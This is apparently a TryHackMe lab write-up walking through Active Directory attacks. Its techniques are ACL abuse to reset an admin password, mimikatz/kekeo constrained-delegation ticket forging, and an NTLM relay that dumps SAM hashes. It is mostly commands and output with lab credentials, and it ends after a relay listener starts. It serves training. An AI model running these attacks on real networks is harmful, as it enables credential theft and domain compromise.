---
title: "THM - Exploiting Active Directory"
classes: wide
header:
  teaser: /assets/images/thm/thm.png
ribbon: cyan-blue
description: "Writeup for THM - # Exploiting Active Directory"
categories:
  - THM
---

The given box ```Exploiting Active Directory``` is a AD machine 

- [TryHackMe-  Exploiting Active Directory](#tryhackme---#Exploiting-Active-Directory)
  - [Introduction](#introduction)
  - [Exploiting Permission Delegation](#exploiting-permission-delegation)
  - [Exploiting Kerberos Delegation](#exploiting-kerberos-delegation)
  - [Exploiting Automated Relays](#exploiting-automated-relays)
  - [Exploiting AD Users](#exploiting-ad-users)
  - [Exploiting GPOs](#exploiting-gpos)
  - [Exploiting Certificates](#exploiting-certificates)
  - [Exploiting Domain Trusts](#exploiting-domain-trusts)
  - [Conclusion](#conclusion)


<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/exploitingad.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/network-diagram1.png" />
</center>

## Introduction

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/mmc1.png" />
</center>

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# sudo systemctl restart NetworkManager

root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# nslookup thmdc.za.tryhackme.loc
Server:         10.200.79.101
Address:        10.200.79.101#53

Name:   thmdc.za.tryhackme.loc
Address: 10.200.79.101
```

http://distributor.za.tryhackme.loc/creds

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# cat assets/doc/ad_creds.txt
Username: max.smith
Password: Kdbt1458 
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# ssh za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\max.smith@THMWRK1 C:\Users\max.smith>
```


## Exploiting Permission Delegation

### BloodHound Enumeration

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/bh1.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/bh2.png" />
</center>

```powershell
za\max.smith@THMWRK1 C:\Users\max.smith>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\max.smith> whoami
za\max.smith
PS C:\Users\max.smith> Add-ADGroupMember "IT Support" -Members "max.smith"
PS C:\Users\max.smith> Get-ADGroupMember -Identity "IT Support"

distinguishedName : CN=max.smith,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc
name              : max.smith
objectClass       : user
objectGUID        : f0cd5ecd-6a42-4eff-8015-071e1dc3747b
SamAccountName    : max.smith
SID               : S-1-5-21-3885271727-2693558621-2658995185-1142
```

```powershell
PS C:\Users\max.smith> Get-ADGroupMember -Identity "Tier 2 Admins"


distinguishedName : CN=t2_lawrence.lewis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_lawrence.lewis
objectClass       : user
objectGUID        : 4ca61b47-93c8-44d2-987d-eca30c69d828
SamAccountName    : t2_lawrence.lewis
SID               : S-1-5-21-3885271727-2693558621-2658995185-1893

distinguishedName : CN=t2_leon.francis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_leon.francis
objectClass       : user
objectGUID        : 854b6d40-d537-4986-b586-c40950e0d5f9
SamAccountName    : t2_leon.francis
SID               : S-1-5-21-3885271727-2693558621-2658995185-3660

distinguishedName : CN=t2_henry.harvey,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_henry.harvey
objectClass       : user
objectGUID        : a3c2db31-6362-4af7-8a3e-20e0c16a664f
SamAccountName    : t2_henry.harvey
SID               : S-1-5-21-3885271727-2693558621-2658995185-4275

distinguishedName : CN=t2_june.russell,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_june.russell
objectClass       : user
objectGUID        : e9b91021-2cb4-4a81-bf09-13a24393ffb7
SamAccountName    : t2_june.russell
SID               : S-1-5-21-3885271727-2693558621-2658995185-4407

distinguishedName : CN=t2_kathleen.mills,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_kathleen.mills
objectClass       : user
objectGUID        : 3be7353e-7c5c-4f46-9790-aef3bbe826a1
SamAccountName    : t2_kathleen.mills
SID               : S-1-5-21-3885271727-2693558621-2658995185-4493

distinguishedName : CN=t2_irene.nash,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_irene.nash
objectClass       : user
objectGUID        : 59429b63-1330-4646-8155-e7d95da0aa68
SamAccountName    : t2_irene.nash
SID               : S-1-5-21-3885271727-2693558621-2658995185-4654

distinguishedName : CN=t2_henry.shaw,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_henry.shaw
objectClass       : user
objectGUID        : 4045398b-de3e-463b-a8e7-085e5f09f478
SamAccountName    : t2_henry.shaw
SID               : S-1-5-21-3885271727-2693558621-2658995185-5230

distinguishedName : CN=t2_alan.riley,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
objectGUID        : d8398c06-1f07-403c-a4b5-0882b1233e1e
SamAccountName    : t2_alan.riley
SID               : S-1-5-21-3885271727-2693558621-2658995185-5243

distinguishedName : CN=t2_jordan.hawkins,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_jordan.hawkins
objectClass       : user
SamAccountName    : t2_jordan.hawkins
SID               : S-1-5-21-3885271727-2693558621-2658995185-5245

distinguishedName : CN=t2_ross.bird,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_ross.bird
objectClass       : user
objectGUID        : d7cb6223-38f0-4553-9ef3-d10727bdcc02
SID               : S-1-5-21-3885271727-2693558621-2658995185-5316

distinguishedName : CN=t2_robin.wyatt,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_robin.wyatt
objectGUID        : 88b92158-56a1-43cb-b21c-1514098524c2
SamAccountName    : t2_robin.wyatt
SID               : S-1-5-21-3885271727-2693558621-2658995185-5409

distinguishedName : CN=t2_caroline.dawson,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_caroline.dawson
objectClass       : user
objectGUID        : 38060b6d-9e78-40bc-95d5-e7d7a61abf6e
SamAccountName    : t2_caroline.dawson
SID               : S-1-5-21-3885271727-2693558621-2658995185-5437

distinguishedName : CN=t2_melanie.davies,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_melanie.davies
objectClass       : user
objectGUID        : c9625ed3-0391-40ba-9c6d-b4046049c434
SamAccountName    : t2_melanie.davies
SID               : S-1-5-21-3885271727-2693558621-2658995185-5929

PS C:\Users\max.smith> net user max.smith /domain
The request will be processed at a domain controller for domain za.tryhackme.loc.

User name                    max.smith
Full Name                    Max Smith
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/25/2022 7:30:04 PM
Password expires             Never
Password changeable          4/26/2022 7:30:04 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/23/2022 4:01:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Internet Access      *IT Support
                             *Domain Users
The command completed successfully.

PS C:\Users\max.smith> $Password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
PS C:\Users\max.smith> Set-ADAccountPassword -Identity "T2_LEON.FRANCIS" -Reset -NewPassword $Password
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# ssh za.tryhackme.loc\\t2_leon.francis@thmwrk1.za.tryhackme.loc
za.tryhackme.loc\t2_leon.francis@thmwrk1.za.tryhackme.loc's password:
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\t2_leon.francis@THMWRK1 C:\Users\t2_leon.francis>
```

```powershell
za\t2_leon.francis@THMWRK1 C:\Users\t2_leon.francis>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\t2_leon.francis> cd C:\Users\
PS C:\Users> ls



Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/25/2022   9:34 PM                Administrator
d-----        4/27/2022   9:53 AM                Administrator.ZA
d-----        7/23/2022  10:50 AM                barbara.reid
d-----        6/10/2022  12:16 PM                brenda.black
d-----        6/13/2022  11:12 AM                chloe.potter
d-----        7/22/2022  10:25 PM                colin.lane
d-----        7/22/2022   2:22 AM                frederick.banks
d-----        6/13/2022  11:12 AM                grace.clarke
d-----        4/30/2022   8:47 PM                hugh.jones
d-----        7/23/2022  11:18 AM                justin.barnes
d-----        7/23/2022   3:43 PM                leon.hobbs
d-----        6/10/2022  12:00 PM                lisa.carr
d-----        7/22/2022   2:40 PM                lorraine.gill
d-----        6/14/2022   4:17 PM                louis.cole
d-----        7/23/2022   9:48 AM                louis.thornton
d-----        7/23/2022   3:45 PM                mandy.anderson
d-----        7/23/2022   3:31 PM                max.smith
d-----        7/23/2022   9:49 AM                nicholas.pearson
d-----        7/22/2022   6:52 AM                paula.bailey
d-----        6/14/2022   4:13 PM                pauline.hargreaves
d-----        7/22/2022   9:27 PM                phillip.wilkins
d-r---        3/21/2020   8:25 PM                Public
d-----        6/13/2022  11:13 AM                reece.noble
d-----        7/22/2022  10:05 AM                sarah.hilton
d-----        6/16/2022  12:32 PM                sean.hopkins
d-----        4/27/2022  12:34 PM                svcIIS
d-----        4/27/2022   6:13 PM                svcServMan
d-----        7/22/2022  12:16 PM                t2_alan.riley
d-----        6/13/2022   1:02 PM                t2_henry.shaw
d-----        7/23/2022   4:07 PM                t2_leon.francis
d-----        4/30/2022   2:21 PM                t2_melanie.davies
d-----        7/23/2022  11:03 AM                t2_ross.bird
d-----        4/27/2022  11:24 AM                thackme
d-----        7/23/2022   1:23 PM                tony.wilson
d-----        3/21/2020   8:52 PM                vagrant


PS C:\Users> cd .\Administrator\Desktop\
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2022  11:53 AM             31 flag1.txt


PS C:\Users\Administrator\Desktop> type .\flag1.txt
THM{Permission.Delegation.FTW!}
```

## Exploiting Kerberos Delegation

### Constrained Delegation Exploitation

```powershell
PS C:\Users\Administrator\Desktop> import-module C:\Tools\PowerView.ps1
PS C:\Users\Administrator\Desktop> Get-NetUser -TrustedToAuth


logoncount               : 41
badpasswordtime          : 7/23/2022 5:00:24 PM
distinguishedname        : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc
objectclass              : {top, person, organizationalPerson, user}
displayname              : IIS Server
lastlogontimestamp       : 7/22/2022 2:19:39 AM
userprincipalname        : svcIIS@za.tryhackme.loc
name                     : IIS Server
objectsid                : S-1-5-21-3885271727-2693558621-2658995185-6155
samaccountname           : svcIIS
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 7/22/2022 1:19:39 AM
instancetype             : 4
usncreated               : 78494
objectguid               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b
sn                       : Server
lastlogoff               : 1/1/1601 12:00:00 AM
msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dscorepropagationdata    : 1/1/1601 12:00:00 AM
serviceprincipalname     : HTTP/svcServWeb.za.tryhackme.loc
givenname                : IIS
lastlogon                : 7/23/2022 5:01:32 PM
badpwdcount              : 0
cn                       : IIS Server
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated              : 4/27/2022 11:26:21 AM
primarygroupid           : 513
pwdlastset               : 4/29/2022 11:50:25 AM
usnchanged               : 147545
```

```powershell
PS C:\Users\Administrator\Desktop> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

492     {0;000003e7} 1 D 17638          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0024c34d} 0 D 3454003     ZA\t2_leon.francis      S-1-5-21-3885271727-2693558621-2658995185-3660  (12g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 3490212     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::secrets
Domain : THMWRK1
SysKey : a1403e57976b472bce5f231922ca3942

Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 )
Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 )
Domain FQDN : za.tryhackme.loc

Policy subsystem is : 1.18
LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}
  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463

Secret  : $MACHINE.ACC
cur/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db
old/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db

Secret  : DefaultPassword
old/text: vagrant

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 b6 54 c4 83 d9 88 10 f6 ee ae fc b7 ed 2d a2 d6 47 11 3f 8f 4a 6d 7f 72 35 b8 a2 93 3d 5c 5e 3f 03 8d 79 49 90 e7 2e e0
    full: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d794990e72ee0
    m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f / 4a6d7f7235b8a2933d5c5e3f038d794990e72ee0
old/hex : 01 00 00 00 10 4d a3 82 e2 da 30 1f 33 d6 49 a4 c9 81 26 e5 25 59 bb 9f 8a 76 b1 5d 59 c6 87 c6 32 b7 02 0b c1 5b 24 f4 44 d0 74 31
    full: 104da382e2da301f33d649a4c98126e52559bb9f8a76b15d59c687c632b7020bc15b24f444d07431
    m/u : 104da382e2da301f33d649a4c98126e52559bb9f / 8a76b15d59c687c632b7020bc15b24f444d07431

Secret  : NL$KM
cur/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 97 ec 7f 49
a1 79 15 d9 a0 04 ac 58
old/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 97 ec 7f 49
a1 79 15 d9 a0 04 ac 58

Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc
cur/text: Password1@
```

```powershell
PS C:\Users\t2_leon.francis> C:\Tools\kekeo\x64\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with 10 modules * * */

kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
Realm        : za.tryhackme.loc (za)
User         : svcIIS (svcIIS)
CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f269c709b20049cee36ae7a
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.79.101 (auto)
  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

PS C:\Tools\kekeo\x64> C:\Tools\kekeo\x64\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with 10 modules * * */

kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_jake.scott /service:http/THMSERVER1.za.tryhackme.loc
Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [7/23/2022 5:41:31 PM ; 7/24/2022 3:41:31 AM] {R:7/30/2022 5:41:31 PM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 2caf4fae394f6571e42cd94e9a49ade46e5e2c70d117745bc3c7f293346ea54c
  [s4u2self]  t1_jake.scott
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.79.101 (auto)
  > Ticket in file 'TGS_t1_jake.scott@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'
Service(s):
  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_jake.scott@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_jake.scott /service:wsman/THMSERVER1.za.tryhackme.loc
Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [7/23/2022 5:41:31 PM ; 7/24/2022 3:41:31 AM] {R:7/30/2022 5:41:31 PM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 2caf4fae394f6571e42cd94e9a49ade46e5e2c70d117745bc3c7f293346ea54c
  [s4u2self]  t1_jake.scott
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.79.101 (auto)
  > Ticket in file 'TGS_t1_jake.scott@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'
Service(s):
  [s4u2proxy] wsman/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_jake.scott@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'
```

```powershell
PS C:\Tools\kekeo\x64> C:\Tools\mimikatz_trunk\x64\mimikatz.exe
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_jake.scott@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_jake.scott@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # exit
Bye!
PS C:\Tools\kekeo\x64> klist

Current LogonId is 0:0x24c34d

Cached Tickets: (2)

        Server: wsman/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 7/23/2022 17:51:41 (local)
        End Time:   7/24/2022 3:50:52 (local)
        Renew Time: 7/30/2022 17:50:52 (local)
        Kdc Called:
        Server: http/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 7/23/2022 17:51:23 (local)
        End Time:   7/24/2022 3:50:52 (local)
        Renew Time: 7/30/2022 17:50:52 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

PS C:\Tools\kekeo\x64> New-PSSession -ComputerName thmserver1.za.tryhackme.loc

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  3 WinRM3          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available


PS C:\Tools\kekeo\x64> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_jake.scott\Documents> whoami
za\t1_jake.scott
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_jake.scott\Documents>
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_jake.scott\Documents> cd C:\Users\Administrator\Desktop\
[thmserver1.za.tryhackme.loc]: PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2022   2:10 PM             92 flag2.txt


[thmserver1.za.tryhackme.loc]: PS C:\Users\Administrator\Desktop> type .\flag2.txt
THM{Constrained.Delegation.Can.Be.Very.Bad}
[thmserver1.za.tryhackme.loc]: PS C:\Users\Administrator\Desktop>
```

## Exploiting Automated Relays

### BloodHound Enumeration

Custom Cypher query -> ```MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p```

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/AD/exploitingad/assets/images/bh3.png" />
</center>

```powershell
PS C:\Tools> .\SpoolSample.exe THMSERVER2.za.tryhackme.loc 10.50.78.162
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\THMSERVER2.za.tryhackme.loc, CaptureServer: \\10.50.78.162
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1707 - The network address is invalid.
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# python /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.79.201 -debug
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.200.79.202, attacking target smb://10.200.79.201
[*] Authenticating against smb://10.200.79.201 as ZA/THMSERVER2$ SUCCEED
[+] No more targets
[*] SMBD-Thread-7 (process_request_thread): Connection from 10.200.79.202 controlled, but there are no more targets left!
[+] No more targets
[*] SMBD-Thread-8 (process_request_thread): Connection from 10.200.79.202 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[+] Retrieving class info for JD
[+] Retrieving class info for Skew1
[+] Retrieving class info for GBG
[+] Retrieving class info for Data
[*] Target system bootKey: 0x4e05e7ea4fdddde75aa56010474948dc
[+] Saving remote SAM database
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[+] Calculating HashedBootKey from SAM
[+] NewStyle hashes is: True
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
[+] NewStyle hashes is: True
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
[+] NewStyle hashes is: True
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
[*] Done dumping SAM hashes for host: 10.200.79.201
[*] Stopping service RemoteRegistry
```

```powershell
PS C:\Tools> .\SpoolSample.exe THMSERVER2.za.tryhackme.loc 10.50.78.162
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\THMSERVER2.za.tryhackme.loc, CaptureServer: \\10.50.78.162
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1707 - The network address is invalid.
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/exploitingad# python /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.79.201 -c 'type C:\Users\Administrator.ZA\Desktop\flag3.txt' -debug
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
